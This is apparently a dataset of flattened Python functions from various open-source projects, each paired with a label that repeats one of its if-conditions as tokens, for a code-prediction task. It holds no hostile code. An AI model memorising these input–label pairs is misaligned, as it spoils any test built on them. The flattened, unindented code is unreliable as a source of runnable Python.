{"input": "def merge_force_collapse(self): p = self.pending while len(p) > 1: if len(p) >= 3 and p[-3].len < p[-1].len: self.merge_at(-3) else: self.merge_at(-2)", "label": "if len ( p ) >= 3 and p [ - 3 ] . len < p [ - 1 ] . len :"}
{"input": "def ensure_echo_on(): if termios: fd = sys.stdin if fd.isatty(): attr_list = termios.tcgetattr(fd) if not attr_list[3] & termios.ECHO: attr_list[3] |= termios.ECHO if hasattr(signal, \"SIGTTOU\"): old_handler = signal.signal(signal.SIGTTOU, signal.SIG_IGN) else: old_handler = None termios.tcsetattr(fd, termios.TCSANOW, attr_list) if old_handler is not None: signal.signal(signal.SIGTTOU, old_handler)", "label": "if hasattr ( signal , \"SIGTTOU\" ) :"}
{"input": "def change_palette_name(self, palette_name): if isinstance(palette_name, str): if palette_name not in PALETTES: log.info(\"Palette name %s not found\", palette_name) return log.debug(\"Settings palette name to %s\", palette_name) self.settings.styleFont.set_string(\"palette\", PALETTES[palette_name]) self.settings.styleFont.set_string(\"palette-name\", palette_name) self.set_colors_from_settings()", "label": "if palette_name not in PALETTES :"}
{"input": "def nested_match(expect, value): if expect == value: return True if isinstance(expect, dict) and isinstance(value, dict): for k, v in expect.items(): if k in value: if not nested_match(v, value[k]): return False else: return False return True if isinstance(expect, list) and isinstance(value, list): for x, y in zip(expect, value): if not nested_match(x, y): return False return True return False", "label": "if not nested_match ( v , value [ k ] ) :"}
{"input": "def _on_event(self, event): event_id = event[\"event_id\"] if event_id == MpvEventID.END_FILE: reason = event[\"event\"][\"reason\"] logger.debug(\"Current song finished. reason: %d\" % reason) if self.state != State.stopped and reason != MpvEventEndFile.ABORTED: self.media_finished.emit() elif event_id == MpvEventID.FILE_LOADED: self.media_loaded.emit()", "label": "if self . state != State . stopped and reason != MpvEventEndFile . ABORTED :"}
{"input": "def __exit__(self, exc_type, exc_value, traceback): self.close() with DB.connection_context(): rows = ( SessionRecord.delete() .where(SessionRecord.f_session_id == self._session_id) .execute() ) if rows > 0: LOGGER.debug(f\"delete session {self._session_id} record\") else: LOGGER.warning(f\"failed delete session {self._session_id} record\")", "label": "if rows > 0 :"}
{"input": "def decorator(*args, **kwargs): # Sets a boolean on the global request context g._flask_user_allow_unconfirmed_email = True # Catch exceptions to properly unset boolean on exceptions try: user_manager = current_app.user_manager # User must be logged in with a confirmed email address allowed = _is_logged_in_with_confirmed_email(user_manager) if not allowed: # Redirect to unauthenticated page return user_manager.unauthenticated_view() # It's OK to call the view return view_function(*args, **kwargs) finally: # Allways unset the boolean, whether exceptions occurred or not g._flask_user_allow_unconfirmed_email = False", "label": "if not allowed :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_app_id(d.getPrefixedString()) continue if tt == 16: self.set_limit(d.getVarInt64()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 16 :"}
{"input": "def addOptions(parser): for optname in options.keys(\"default\"): if optname.startswith(\"color_\") or optname.startswith(\"disp_\"): continue action = \"store_true\" if options[optname] is False else \"store\" try: parser.add_argument( \"--\" + optname.replace(\"_\", \"-\"), action=action, dest=optname, default=None, help=options._opts._get(optname).helpstr, ) except argparse.ArgumentError: pass", "label": "if optname . startswith ( \"color_\" ) or optname . startswith ( \"disp_\" ) :"}
{"input": "def make_relative_to(self, kwds, relative_to): if relative_to and os.path.dirname(relative_to): dirname = os.path.dirname(relative_to) kwds = kwds.copy() for key in ffiplatform.LIST_OF_FILE_NAMES: if key in kwds: lst = kwds[key] if not isinstance(lst, (list, tuple)): raise TypeError(\"keyword '%s' should be a list or tuple\" % (key,)) lst = [os.path.join(dirname, fn) for fn in lst] kwds[key] = lst return kwds", "label": "if key in kwds :"}
{"input": "def _options_fcheck(self, name, xflags, table): for entry in table: if entry.name is None: break if entry.flags & XTOPT_MAND and not xflags & (1 << entry.id): raise XTablesError(\"%s: --%s must be specified\" % (name, entry.name)) if not xflags & (1 << entry.id): continue", "label": "if entry . name is None :"}
{"input": "def _load_cmds(): prefix = \"AOE_CMD_\" g = globals() for k, v in iteritems(g): if k.startswith(prefix): name = \"aoe\" + k[len(prefix) :].lower() try: mod = __import__(name, g, level=1) AOE.set_cmd(v, getattr(mod, name.upper())) except (ImportError, AttributeError): continue", "label": "if k . startswith ( prefix ) :"}
{"input": "def test_list_sizes(self): sizes = self.driver.list_sizes() self.assertEqual(len(sizes), 7, \"Wrong sizes count\") for size in sizes: self.assertTrue(isinstance(size.price, float), \"Wrong size price type\") if self.driver.api_name == \"openstack\": self.assertEqual(size.price, 0, \"Size price should be zero by default\")", "label": "if self . driver . api_name == \"openstack\" :"}
{"input": "def testToFileBinary(self): z = dns.zone.from_file(here(\"example\"), \"example\") try: f = open(here(\"example3-binary.out\"), \"wb\") z.to_file(f) f.close() ok = compare_files( \"testToFileBinary\", here(\"example3-binary.out\"), here(\"example3.good\") ) finally: if not _keep_output: os.unlink(here(\"example3-binary.out\")) self.assertTrue(ok)", "label": "if not _keep_output :"}
{"input": "def ip_list(_): ips = [] for ip in _.split(\" \"): if not ip: continue elif isip(ip): ips.append(IP.create(ip)) else: raise TypeError(\"ip %s is invalid\" % ip) return ips", "label": "if not ip :"}
{"input": "def _wait_for_state(self, server_id, state, retries=50): for i in (0, retries): server = self.ex_get_server(server_id) if server.extra[\"status\"][\"state\"] == state: return sleep(5) if i == retries: raise Exception(\"Retries count reached\")", "label": "if i == retries :"}
{"input": "def _stretch_prev(data): clip, track, item_id, item_data = data try: prev_index = track.clips.index(clip) - 1 if prev_index < 0: return # clip is first clip if track.clips[prev_index].is_blanck_clip == True: # Next clip is blank so we can do this. clip = track.clips[prev_index] data = (clip, track, item_id, item_data) _cover_blank_from_next(data, True) except: pass # any error means that this can't be done", "label": "if track . clips [ prev_index ] . is_blanck_clip == True :"}
{"input": "def characters(self, ch): if self._inside_fuzzable: modified_value = self._fuzzed_parameters[self._fuzzable_index][1] if isinstance(modified_value, DataToken): modified_value = modified_value.get_value() if self._fuzzed_parameters[self._fuzzable_index][0] == \"base64\": enc_val = base64.b64encode(modified_value) else: enc_val = cgi.escape(modified_value).encode(\"ascii\", \"xmlcharrefreplace\") self.fuzzed_xml_string += enc_val else: self.fuzzed_xml_string += ch", "label": "if isinstance ( modified_value , DataToken ) :"}
{"input": "def _make_sure_scheduler_ready(self, timeout=120): check_start_time = time.time() while True: workers_meta = self._scheduler_service._resource_ref.get_workers_meta() if not workers_meta: # wait for worker to report status self._pool.sleep(0.5) if time.time() - check_start_time > timeout: # pragma: no cover raise TimeoutError(\"Check worker ready timed out.\") else: break", "label": "if not workers_meta :"}
{"input": "def tiles_around(self, pos, radius=1, predicate=None): ps = [] x, y = pos for dx in range(-radius, radius + 1): nx = x + dx if nx >= 0 and nx < self.width: for dy in range(-radius, radius + 1): ny = y + dy if ny >= 0 and ny < self.height and (dx != 0 or dy != 0): if predicate is None or predicate((nx, ny)): ps.append((nx, ny)) return ps", "label": "if ny >= 0 and ny < self . height and ( dx != 0 or dy != 0 ) :"}
{"input": "def tearDown(self): for i in ScriptVersion.objects.all(): name = i.script_path.name utils.get_storage().delete(name) if wooey_settings.WOOEY_EPHEMERAL_FILES: try: utils.get_storage(local=False).delete(name) except WindowsError: print(\"unable to delete {}\".format(name)) name += \"c\" # handle pyc junk try: utils.get_storage().delete(name) except WindowsError: print(\"unable to delete {}\".format(name)) super(ScriptTearDown, self).tearDown()", "label": "if wooey_settings . WOOEY_EPHEMERAL_FILES :"}
{"input": "def _fill_tc_results(self): tids = list(self.tc._results.keys()) fields = [\"failures\", \"errors\", \"skipped\", \"expectedFailures\"] for tid in tids: result = self.tc._results[tid] for field in fields: if not field in self.tc._results: self.tc._results[field] = [] self.tc._results[field].extend(result[field])", "label": "if not field in self . tc . _results :"}
{"input": "def check_mixin_inheritance(bases): for b in bases: check_mixin_inheritance(b.__bases__) for k, v in vars(b).items(): if _is_interesting(k, v): _type_info[k] = _process_item(v)", "label": "if _is_interesting ( k , v ) :"}
{"input": "def _check_params(swa_freq): params = [swa_freq] params_none = [param is None for param in params] if not all(params_none) and any(params_none): warnings.warn(\"Some of swa_start, swa_freq is None, ignoring other\") for i, param in enumerate(params): if param is not None and not isinstance(param, int): params[i] = int(param) warnings.warn(\"Casting swa_start, swa_freq to int\") return not any(params_none), params", "label": "if param is not None and not isinstance ( param , int ) :"}
{"input": "def findBookmark(self, bookmark, root=None): if root == None: root = self.bookmarks for i, b in enumerate(root): if isinstance(b, list): res = self.findBookmark(bookmark, b) if res: return [i] + res elif b == bookmark or b[\"/Title\"] == bookmark: return [i] return None", "label": "if res :"}
{"input": "def best_match(self, matches, default=None): best_quality = -1 result = default for server_item in matches: for client_item, quality in self: if quality <= best_quality: break if self._value_matches(server_item, client_item) and quality > 0: best_quality = quality result = server_item return result", "label": "if quality <= best_quality :"}
{"input": "def validate_external_users(self): if self.user and settings.ALLOW_OAUTH2_FOR_EXTERNAL_USERS is False: external_account = get_external_account(self.user) if external_account is not None: raise oauth2.AccessDeniedError( _( \"OAuth2 Tokens cannot be created by users associated with an external authentication provider ({})\" ).format(external_account) )", "label": "if external_account is not None :"}
{"input": "def get_tzname(self): # Timezone conversions must happen to the input datetime *before* # applying a function. 2015-12-31 23:00:00 -02:00 is stored in the # database as 2016-01-01 01:00:00 +00:00. Any results should be # based on the input datetime not the stored datetime. tzname = None if settings.USE_TZ: if self.tzinfo is None: tzname = timezone.get_current_timezone_name() else: tzname = timezone._get_timezone_name(self.tzinfo) return tzname", "label": "if self . tzinfo is None :"}
{"input": "def _get_editable_fields(cls): fds = set([]) for field in cls._meta.concrete_fields: if hasattr(field, \"attname\"): if field.attname == \"id\": continue elif field.attname.endswith(\"ptr_id\"): # polymorphic fields should always be non-editable, see: # https://github.com/django-polymorphic/django-polymorphic/issues/349 continue if getattr(field, \"editable\", True): fds.add(field.attname) return fds", "label": "if getattr ( field , \"editable\" , True ) :"}
{"input": "def p_advsimd_secondary(val, va, mnem, opcode, flags, opers): if opcode == INS_VORR: src1 = (val >> 16) & 0xF src2 = (val) & 0xF if src1 == src2: opers = ( ArmRegOper(rctx.getRegisterIndex(rbase % d)), ArmRegOper(rctx.getRegisterIndex(rbase % n)), ) return \"vmov\", INS_VMOV, None, opers return None, None, None, None", "label": "if src1 == src2 :"}
{"input": "def list_urls(self): for idx, job in enumerate(self.urlwatcher.jobs): if self.urlwatch_config.verbose: print(\"%d: %s\" % (idx + 1, repr(job))) else: pretty_name = job.pretty_name() location = job.get_location() if pretty_name != location: print(\"%d: %s ( %s )\" % (idx + 1, pretty_name, location)) else: print(\"%d: %s\" % (idx + 1, pretty_name)) return 0", "label": "if self . urlwatch_config . verbose :"}
{"input": "def _split_auth_string(auth_string): \"\"\"split a digest auth string into individual key=value strings\"\"\" prev = None for item in auth_string.split(\",\"): try: if prev.count('\"') == 1: prev = \"%s,%s\" % (prev, item) continue except AttributeError: if prev == None: prev = item continue else: raise StopIteration yield prev.strip() prev = item yield prev.strip() raise StopIteration", "label": "if prev == None :"}
{"input": "def _get_user_auth_session_cookie(self, url, username, password): get_response = requests.get(url) # auth request to kfp server with istio dex look like '/dex/auth/local?req=REQ_VALUE' if \"auth\" in get_response.url: credentials = {\"login\": username, \"password\": password} # Authenticate user session = requests.Session() session.post(get_response.url, data=credentials) cookie_auth_key = \"authservice_session\" cookie_auth_value = session.cookies.get(cookie_auth_key) if cookie_auth_value: return cookie_auth_key + \"=\" + cookie_auth_value", "label": "if cookie_auth_value :"}
{"input": "def copychunked(src, dest): chunksize = 524288 # half a meg of bytes fsrc = src.open(\"rb\") try: fdest = dest.open(\"wb\") try: while 1: buf = fsrc.read(chunksize) if not buf: break fdest.write(buf) finally: fdest.close() finally: fsrc.close()", "label": "if not buf :"}
{"input": "def iterate_all_python_files(base_path): # TODO support ignored directories/files for dirname, subdirlist, filelist in os.walk(base_path): if \"__pycache__\" in dirname: continue for filename in filelist: if filename.endswith(\".py\"): yield os.path.join(base_path, dirname, filename)", "label": "if filename . endswith ( \".py\" ) :"}
{"input": "def discover(self, *objlist): ret = [] for l in self.splitlines(): if l[0] != \"intr\": continue for name, i in enumerate(l[2:]): if int(i) > 10: ret.append(str(name)) return ret", "label": "if int ( i ) > 10 :"}
{"input": "def call_url(self, expected_url, with_error=False): try: with self.best_url_selector.select_best_url() as url: self.assertEqual(urlparse(expected_url), url) if with_error: raise RequestException(\"error connecting to {}\".format(url)) except RequestException: pass", "label": "if with_error :"}
{"input": "def __init__(self, action_space=None, network=None, network_kwargs=None, hparams=None): PolicyNetBase.__init__(self, hparams=hparams) with tf.variable_scope(self.variable_scope): if action_space is None: action_space = Space(low=0, high=self._hparams.action_space, dtype=np.int32) self._action_space = action_space self._append_output_layer()", "label": "if action_space is None :"}
{"input": "def gettempfilename(suffix): \"\"\"Returns a temporary filename\"\"\" if \"_\" in os.environ: # tempfile.mktemp() crashes on some Wine versions (the one of Ubuntu 12.04 particularly) if os.environ[\"_\"].find(\"wine\") >= 0: tmpdir = \".\" if \"TMP\" in os.environ: tmpdir = os.environ[\"TMP\"] import time import random random.seed(time.time()) random_part = \"file%d\" % random.randint(0, 1000000000) return os.path.join(tmpdir, random_part + suffix) return tempfile.mktemp(suffix)", "label": "if \"TMP\" in os . environ :"}
{"input": "def get_url(self): if self.url_patterns: v_url = match1(self.html, *self.url_patterns) if v_url.startswith(\"http%3A\"): v_url = compact_unquote(v_url) self.v_url = [v_url]", "label": "if v_url . startswith ( \"http%3A\" ) :"}
{"input": "def drain(self, fd): \"\"\"Make `fd` unreadable.\"\"\" while True: try: if not os.read(fd, 4096): return except OSError: e = sys.exc_info()[1] if e.args[0] == errno.EAGAIN: return raise", "label": "if not os . read ( fd , 4096 ) :"}
{"input": "def tearDown(self): # make sure all of the subprocesses are dead for pidfile in self.pidfiles: if not os.path.exists(pidfile): continue with open(pidfile) as f: pid = f.read() if not pid: return pid = int(pid) try: os.kill(pid, signal.SIGKILL) except OSError: pass # and clean up leftover pidfiles for pidfile in self.pidfiles: if os.path.exists(pidfile): os.unlink(pidfile) self.tearDownBasedir()", "label": "if not os . path . exists ( pidfile ) :"}
{"input": "def main(): # Arguments input_fname, out_fname = sys.argv[1:] # Do conversion. index = Indexes() offset = 0 reader_wrapper = GFFReaderWrapper(fileinput.FileInput(input_fname), fix_strand=True) for feature in list(reader_wrapper): # Add feature; index expects BED coordinates. if isinstance(feature, GenomicInterval): convert_gff_coords_to_bed(feature) index.add(feature.chrom, feature.start, feature.end, offset) # Always increment offset, even if feature is not an interval and hence # not included in the index. offset += feature.raw_size index.write(open(out_fname, \"wb\"))", "label": "if isinstance ( feature , GenomicInterval ) :"}
{"input": "def _s_wise_max(a_indices, a_indptr, vals, out_max): n = len(out_max) for i in range(n): if a_indptr[i] != a_indptr[i + 1]: m = a_indptr[i] for j in range(a_indptr[i] + 1, a_indptr[i + 1]): if vals[j] > vals[m]: m = j out_max[i] = vals[m]", "label": "if a_indptr [ i ] != a_indptr [ i + 1 ] :"}
{"input": "def update_encryption_keys(self, options): if not options[\"pools\"] and not options[\"datasets\"]: raise CallError(\"Please specify pools/datasets to update\") async with ENCRYPTION_CACHE_LOCK: keys = await self.encryption_keys() for pool in options[\"pools\"]: keys[\"geli\"][pool[\"name\"]] = pool[\"passphrase\"] for dataset in options[\"datasets\"]: keys[\"zfs\"][dataset[\"name\"]] = dataset[\"passphrase\"] await self.middleware.call(\"cache.put\", \"failover_encryption_keys\", keys) if options[\"sync_keys\"]: await self.sync_keys_to_remote_node(lock=False)", "label": "if options [ \"sync_keys\" ] :"}
{"input": "def set_lineno(self, lineno, override=False): \"\"\"Set the line numbers of the node and children.\"\"\" todo = deque([self]) while todo: node = todo.popleft() if \"lineno\" in node.attributes: if node.lineno is None or override: node.lineno = lineno todo.extend(node.iter_child_nodes()) return self", "label": "if node . lineno is None or override :"}
{"input": "def is_ArAX_implicit(ii): # allows one implicit fixed reg a, implicit_fixed = 0, 0 for op in _gen_opnds(ii): if op_luf_start(op, \"ArAX\"): a += 1 elif op_reg(op) and op_implicit_specific_reg(op): implicit_fixed += 1 else: return False return a == 1 and implicit_fixed <= 1", "label": "if op_luf_start ( op , \"ArAX\" ) :"}
{"input": "def __iter__(self): if hasattr(self, \"error_dict\"): for field, errors in self.error_dict.items(): yield field, list(ValidationError(errors)) else: for error in self.error_list: message = error.message if error.params: message %= error.params yield force_text(message)", "label": "if error . params :"}
{"input": "def _mul_matrix(self, other): if isinstance(other, ConstantDiagLazyTensor): if not self.diag_shape == other.diag_shape: raise ValueError( \"Dimension Mismatch: Must have same diag_shape, but got \" f\"{self.diag_shape} and {other.diag_shape}\" ) return self.__class__( self.diag_values * other.diag_values, diag_shape=self.diag_shape ) return super()._mul_matrix(other)", "label": "if not self . diag_shape == other . diag_shape :"}
{"input": "def test_no_metadata_when_py_is_pep8(py_file): \"\"\"This test assumes that all Python files in the jupytext folder follow PEP8 rules\"\"\" nb = read(py_file) for i, cell in enumerate(nb.cells): if \"title\" in cell.metadata: cell.metadata.pop(\"title\") # pragma: no cover if i == 0 and not cell.source: assert cell.metadata == {\"lines_to_next_cell\": 0}, py_file else: assert not cell.metadata, (py_file, cell.source)", "label": "if \"title\" in cell . metadata :"}
{"input": "def forward(self, x: Tensor, edge_index: Adj) -> Tensor: \"\"\"\"\"\" if self.add_self_loops: if isinstance(edge_index, Tensor): edge_index, _ = remove_self_loops(edge_index) edge_index, _ = add_self_loops(edge_index, num_nodes=x.size(self.node_dim)) elif isinstance(edge_index, SparseTensor): edge_index = set_diag(edge_index) x_norm = F.normalize(x, p=2.0, dim=-1) # propagate_type: (x: Tensor, x_norm: Tensor) return self.propagate(edge_index, x=x, x_norm=x_norm, size=None)", "label": "if isinstance ( edge_index , Tensor ) :"}
{"input": "def should_wait(self, offer_hash: str): with self._lock: if self._offer_hash is not None: if self._offer_hash != offer_hash: logger.debug( \"already processing another offer (%s vs %s)\", self._offer_hash, offer_hash, ) return True if self._started == self._wtct_num_subtasks: logger.info(\"all subtasks for `%s` have been started\", self._offer_hash) return True return False", "label": "if self . _offer_hash != offer_hash :"}
{"input": "def _wrap_linespans(self, inner): s = self.linespans i = self.linenostart - 1 for t, line in inner: if t: i += 1 yield 1, '<span id=\"%s-%d\">%s</span>' % (s, i, line) else: yield 0, line", "label": "if t :"}
{"input": "def onRemoteResponse(self, response, request_info): if isinstance(response, (dict,)): if \"echo\" in response: msg = \"Celery echo: %s\\nElapsed Time: %d\" self.setText(msg % (response[\"echo\"], self.wait_cnt)) else: msg = \"Waiting for Celery (id, checkno): %s, %d\" Label.setText(self, msg % (self.task_id, self.wait_cnt)) else: self.setText(\"Could not get remote response as a dictionary\")", "label": "if \"echo\" in response :"}
{"input": "def Visit_expr_stmt(self, node): # pylint: disable=invalid-name # expr_stmt ::= testlist_star_expr (augassign (yield_expr|testlist) # | ('=' (yield_expr|testlist_star_expr))*) for child in node.children: self.Visit(child) if isinstance(child, pytree.Leaf) and child.value == \"=\": _AppendTokenSubtype(child, format_token.Subtype.ASSIGN_OPERATOR)", "label": "if isinstance ( child , pytree . Leaf ) and child . value == \"=\" :"}
{"input": "def _list_outputs(self): outputs = self.output_spec().get() isHeader = True for key in self._outfields: outputs[key] = [] # initialize outfields with open(self.inputs.in_file, \"r\") as fid: for line in fid.readlines(): if self.inputs.header and isHeader: # skip header line isHeader = False continue entry = self._parse_line(line) outputs = self._append_entry(outputs, entry) return outputs", "label": "if self . inputs . header and isHeader :"}
{"input": "def _get_tables(self, schema): cursor = self._get_cursor() schemas = self.configuration.get( \"schemas\", self.configuration.get(\"database\", \"\") ).split(\",\") for schema_name in schemas: cursor.columns(schema=schema_name) for column in cursor: table_name = \"{}.{}\".format(column[1], column[2]) if table_name not in schema: schema[table_name] = {\"name\": table_name, \"columns\": []} schema[table_name][\"columns\"].append(column[3]) return list(schema.values())", "label": "if table_name not in schema :"}
{"input": "def __setitem__(self, index, value): if self._physics.is_dirty and not self._triggers_dirty: self._physics.forward() super(_SynchronizingArrayWrapper, self).__setitem__(index, value) if isinstance(self._backing_index, collections.Iterable): if isinstance(index, tuple): resolved_index = (self._backing_index[index[0]],) + index[1:] else: resolved_index = self._backing_index[index] self._backing_array[resolved_index] = value if self._triggers_dirty: self._physics.mark_as_dirty()", "label": "if isinstance ( index , tuple ) :"}
{"input": "def fit_test_data(self, data, fit_values, imputer_value): for j in range(len(data)): for i in range(len(data[j])): if data[j][i] in imputer_value: data[j][i] = str(fit_values[i]) return data", "label": "if data [ j ] [ i ] in imputer_value :"}
{"input": "def Compare_in(t, x): if not isinstance(x.ops[0], (ast.NotIn, ast.In)): return if t.enable_snippets: from ..snippets import _in, in_es6 if t.enable_es6: t.add_snippet(in_es6) sname = \"in_es6\" else: t.add_snippet(_in) sname = \"_in\" result = JSCall(JSAttribute(\"_pj\", sname), [x.left, x.comparators[0]]) if isinstance(x.ops[0], ast.NotIn): result = JSUnaryOp(JSOpNot(), result) return result", "label": "if isinstance ( x . ops [ 0 ] , ast . NotIn ) :"}
{"input": "def __init__(self, f): self._refs = {} self._peeled = {} for line in f.readlines(): sha, name = line.rstrip(b\"\\n\").split(b\"\\t\") if name.endswith(ANNOTATED_TAG_SUFFIX): name = name[:-3] if not check_ref_format(name): raise ValueError(\"invalid ref name %r\" % name) self._peeled[name] = sha else: if not check_ref_format(name): raise ValueError(\"invalid ref name %r\" % name) self._refs[name] = sha", "label": "if not check_ref_format ( name ) :"}
{"input": "def info(args): # Check grammar p = Python37Parser() if len(args) > 0: arg = args[0] if arg == \"3.7\": from uncompyle6.parser.parse37 import Python37Parser p = Python37Parser() elif arg == \"3.8\": from uncompyle6.parser.parse38 import Python38Parser p = Python38Parser() else: raise RuntimeError(\"Only 3.7 and 3.8 supported\") p.check_grammar() if len(sys.argv) > 1 and sys.argv[1] == \"dump\": print(\"-\" * 50) p.dump_grammar()", "label": "if arg == \"3.7\" :"}
{"input": "def test_ESPnetDataset_text_float(text_float): dataset = IterableESPnetDataset( path_name_type_list=[(text_float, \"data8\", \"text_float\")], preprocess=preprocess, ) for key, data in dataset: if key == \"a\": assert all((data[\"data8\"]) == np.array([1.4, 3.4], dtype=np.float32)) if key == \"b\": assert all((data[\"data8\"]) == np.array([0.9, 9.3], dtype=np.float32))", "label": "if key == \"b\" :"}
{"input": "def getting(self, key, lock=False): if not lock: yield self.get(key) else: locked = False try: data = self._get_or_lock(key) locked = data is None yield data finally: if locked: self._release_lock(key)", "label": "if locked :"}
{"input": "def mkdir(self, path, parents=True, raise_if_exists=False): if self.exists(path): if not self.isdir(path): raise luigi.target.NotADirectory() elif raise_if_exists: raise luigi.target.FileAlreadyExists() else: return self.conn.files_create_folder_v2(path)", "label": "if not self . isdir ( path ) :"}
{"input": "def _get_initiated_elections(cls, height, txns): elections = [] for tx in txns: if not isinstance(tx, Election): continue elections.append( {\"election_id\": tx.id, \"height\": height, \"is_concluded\": False} ) return elections", "label": "if not isinstance ( tx , Election ) :"}
{"input": "def recalc_active(self, ts): if not self.active_seconds: self.active_seconds.append(ts) self.data[ts] = {} if ts not in self.active_seconds: if ts > max(self.active_seconds): for i in range(max(self.active_seconds) + 1, ts + 1): self.active_seconds.append(i) self.active_seconds.sort() self.data[i] = {} while len(self.active_seconds) > self.window: self.active_seconds.pop(0) for sec in self.data.keys(): if sec not in self.active_seconds: self.data.pop(sec)", "label": "if ts > max ( self . active_seconds ) :"}
{"input": "def get_scalar_base(schema, scalar) -> Tuple[str, ...]: base = base_type_name_map.get(scalar.id) if base is not None: return base for ancestor in scalar.get_ancestors(schema).objects(schema): if not ancestor.get_is_abstract(schema): # Check if base is fundamental, if not, then it is # another domain. try: base = base_type_name_map[ancestor.id] except KeyError: base = common.get_backend_name(schema, ancestor, catenate=False) return base raise ValueError( f\"cannot determine backend type for scalar type \" f\"{scalar.get_name(schema)}\" )", "label": "if not ancestor . get_is_abstract ( schema ) :"}
{"input": "def __next__(self): try: value = next(self._iterable) if self.start_time is None: self.start() else: self.update(self.value + 1) return value except StopIteration: self.finish() raise except GeneratorExit: # pragma: no cover self.finish(dirty=True) raise", "label": "if self . start_time is None :"}
{"input": "def change_password(username=\"flexget\", password=\"\", session=None): check = zxcvbn.zxcvbn(password, user_inputs=[username]) if check[\"score\"] < 3: warning = check[\"feedback\"][\"warning\"] suggestions = \" \".join(check[\"feedback\"][\"suggestions\"]) message = \"Password '{}' is not strong enough. \".format(password) if warning: message += warning + \" \" if suggestions: message += \"Suggestions: {}\".format(suggestions) raise WeakPassword(message) user = get_user(username=username, session=session) user.password = str(generate_password_hash(password)) session.commit()", "label": "if warning :"}
{"input": "def _options_fcheck(self, name, xflags, table): for entry in table: if entry.name is None: break if entry.flags & XTOPT_MAND and not xflags & (1 << entry.id): raise XTablesError(\"%s: --%s must be specified\" % (name, entry.name)) if not xflags & (1 << entry.id): continue", "label": "if not xflags & ( 1 << entry . id ) :"}
{"input": "def parse_ports(container_name, connection_configuration): while True: ports_command = docker_util.build_docker_simple_command( \"port\", container_name=container_name, **connection_configuration ) with tempfile.TemporaryFile(prefix=\"docker_port_\") as stdout_file: exit_code = subprocess.call( ports_command, shell=True, stdout=stdout_file, preexec_fn=os.setpgrp ) if exit_code == 0: stdout_file.seek(0) ports_raw = stdout_file.read().decode(\"utf-8\") return ports_raw", "label": "if exit_code == 0 :"}
{"input": "def _init_ti_table(): global _ti_table _ti_table = [] for fname, name in zip(kc.STRFNAMES, kc.STRNAMES): seq = termcap.get(name) if not seq: continue k = _name_to_key(fname) if k: _ti_table.append((list(bytearray(seq)), k))", "label": "if k :"}
{"input": "def sanitize_args(a): try: args, kwargs = a if isinstance(args, tuple) and isinstance(kwargs, dict): return args, dict(kwargs) except (TypeError, ValueError): args, kwargs = (), {} if a is not None: if isinstance(a, dict): args = tuple() kwargs = a elif isinstance(a, tuple): if isinstance(a[-1], dict): args, kwargs = a[0:-1], a[-1] else: args = a kwargs = {} return args, kwargs", "label": "if isinstance ( a , dict ) :"}
{"input": "def fork_with_import_lock(level): release = 0 in_child = False try: try: for i in range(level): imp.acquire_lock() release += 1 pid = os.fork() in_child = not pid finally: for i in range(release): imp.release_lock() except RuntimeError: if in_child: if verbose > 1: print(\"RuntimeError in child\") os._exit(1) raise if in_child: os._exit(0) self.wait_impl(pid)", "label": "if verbose > 1 :"}
{"input": "def _capture_hub(self, create): # Subclasses should call this as the first action from any # public method that could, in theory, block and switch # to the hub. This may release the GIL. if self.hub is None: # This next line might release the GIL. current_hub = get_hub() if create else get_hub_if_exists() if current_hub is None: return # We have the GIL again. Did anything change? If so, # we lost the race. if self.hub is None: self.hub = current_hub", "label": "if current_hub is None :"}
{"input": "def get_user_makepkg_path(cls) -> Optional[str]: if cls._user_makepkg_path == \"unset\": possible_paths = [ os.path.expanduser(\"~/.makepkg.conf\"), os.path.join(CONFIG_ROOT, \"pacman/makepkg.conf\"), ] config_path: Optional[str] = None for path in possible_paths: if os.path.exists(path): config_path = path cls._user_makepkg_path = config_path return cls._user_makepkg_path", "label": "if os . path . exists ( path ) :"}
{"input": "def createValue(self): mode = [] for name in self._text_keys: if self[name].value: if 4 <= len(mode): mode.append(\"...\") break else: mode.append(name) if mode: return \", \".join(mode) else: return \"(none)\"", "label": "if self [ name ] . value :"}
{"input": "def keyPressEvent(self, event): if event.key() in (Qt.Key_Right, Qt.Key_Left): direction = 1 if event.key() == Qt.Key_Left: direction = -1 if event.modifiers() == Qt.ShiftModifier: print(\"shift\") direction *= 10 self.timeline.setValue(self.timeline.value() + direction) else: super(VideoPlayerWidget, self).keyPressEvent(event)", "label": "if event . modifiers ( ) == Qt . ShiftModifier :"}
{"input": "def validate_wrapper(*args, **kwargs): result = self.validate_func(*args, **kwargs) if request.is_xhr: if not isinstance(result, dict): result = {} result.setdefault(\"success\", True) values = result.get(\"values\", {}) for key, value in tmpl_context.form_values.iteritems(): values.setdefault(key, value) return result", "label": "if not isinstance ( result , dict ) :"}
{"input": "def copy_metadata_to(self, target_dir): prefix = os.path.join(self.egg_info, \"\") for path in self.ei_cmd.filelist.files: if path.startswith(prefix): target = os.path.join(target_dir, path[len(prefix) :]) ensure_directory(target) self.copy_file(path, target)", "label": "if path . startswith ( prefix ) :"}
{"input": "def _get_switch_info(self, cmd_list): stdout, stderr, sw_data = None, None, None try: stdout, stderr = self._run_ssh(cmd_list, True) LOG.debug(\"CLI output from ssh - output: %s\", stdout) if stdout: sw_data = stdout.splitlines() return sw_data except processutils.ProcessExecutionError as e: msg = _( \"Error while getting data via ssh: (command=%(cmd)s \" \"error=%(err)s).\" ) % {\"cmd\": cmd_list, \"err\": six.text_type(e)} LOG.error(msg) raise exception.CiscoZoningCliException(reason=msg)", "label": "if stdout :"}
{"input": "def analyze(vw): for va, dest in vw.findPointers(): # Is there a location already at the target? loc = vw.getLocation(dest) if loc is None: continue if loc[L_LTYPE] != LOC_IMPORT: continue offset, bytes = vw.getByteDef(va) if offset < 2: continue if bytes[offset - 2 : offset] == b\"\\xff\\x15\": # call [importloc] # If there's a pointer here, remove it. if vw.getLocation(va): vw.delLocation(va) vw.makeCode(va - 2)", "label": "if offset < 2 :"}
{"input": "def _freeze_stages(self): \"\"\"Freeze parameters.\"\"\" if self.frozen_stages >= 0: if self.deep_stem: self.stem.eval() for param in self.stem.parameters(): param.requires_grad = False else: self.norm1.eval() for m in [self.conv1, self.norm1]: for param in m.parameters(): param.requires_grad = False for i in range(1, self.frozen_stages + 1): m = getattr(self, f\"layer{i}\") m.eval() for param in m.parameters(): param.requires_grad = False", "label": "if self . deep_stem :"}
